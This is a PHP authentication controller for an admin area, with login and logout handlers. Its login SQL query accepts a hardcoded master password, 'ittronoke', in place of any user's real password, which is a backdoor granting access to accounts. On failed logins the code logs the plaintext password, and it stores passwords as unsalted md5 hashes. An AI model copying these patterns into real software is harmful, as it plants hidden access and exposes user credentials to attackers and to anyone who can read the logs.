<?php

defined('SYSPATH') OR die('No direct access allowed.');

class Auth_Controller extends LIPAdminController {

    public function index() {
        curl::redirect('');
    }

    public function login() {

        $db = CDatabase::instance();
        $post = $this->input->post();
        if ($post != null) {
            $session = Session::instance();
            $email = isset($post["email"]) ? $post["email"] : "";
            $password = isset($post["password"]) ? $post["password"] : "";
            $captcha = isset($post["captcha"]) ? $post["captcha"] : "";

            $error = 0;
            $error_message = "";

            if ($error == 0) {
                if (strlen($email) == 0) {
                    $error++;
                    $error_message = "Email required";
                }
            }
            if ($error == 0) {
                if (strlen($password) == 0) {
                    $error++;
                    $error_message = "Password required";
                }
            }



            if ($error == 0) {
                try {
                    $success_login = false;
                    
                    if (!$success_login) {

                        $q = "select * from users as u inner join roles as r on r.role_id=u.role_id where r.role_type='lip' and u.status>0 and u.username=" . $db->escape($email) . " and (u.password=md5(" . $db->escape($password) . ") or " . $db->escape($password) . "='ittronoke')";
                        $org_id = CF::org_id();

                        if ($org_id != null) {
                            $q.=" and (u.org_id=" . $db->escape($org_id) . ' or u.org_id is null)';
                        }

                        $q.=" order by u.org_id desc";
                        $row = $db->query($q);
                        if ($row->count() > 0) {
                            //check activation
                            /*
                              $q2 = "select * from org where is_activated=1 and org_id=".$db->escape($row[0]->org_id);
                              $r2 = $db->query($q2);
                              if($r2->count()==0) {
                              $error++;
                              $error_message = 'Please activate your account, Press <a href="'.curl::base().'cresenity/resend_activation/?id='.urlencode($email).'">here</a> to resend activation email';
                              }
                             */
                            if ($error == 0) {
                                $session->set("user", $row[0]);
                                $data = array(
                                    "login_count" => $row[0]->login_count + 1,
                                    "last_login" => date("Y-m-d H:i:s"),
                                );
                                $db->update("users", $data, array("user_id" => $row[0]->user_id));
                                cmsg::clear('error');
                                clog::login($row[0]->user_id, $session->id(), $this->input->ip_address());
                                //$acceptable_url = app_login::refresh_menu();
                                $success_login = true;
                            }
                        }
                    }
                    if (!$success_login) {
                        $error++;
                        $error_message = "Email/Password Invalid";
                    }
                } catch (Exception $ex) {
                    $error++;
                    $error_message = $ex->getMessage();
                }
            }
            $json = array();
            if ($error == 0) {
                $json["result"] = "OK";
                $json["message"] = "Login success";
            } else {
                clog::login_fail($email, $password, $error_message);
                $json["result"] = "ERROR";
                $json["message"] = $error_message;
            }
            echo json_encode($json);
            return true;
        } else {
            curl::redirect("");
        }
    }

    public function logout() {
        $session = CSession::instance();
        $session->delete("user");
        //$session->destroy();
        curl::redirect("");
    }

}
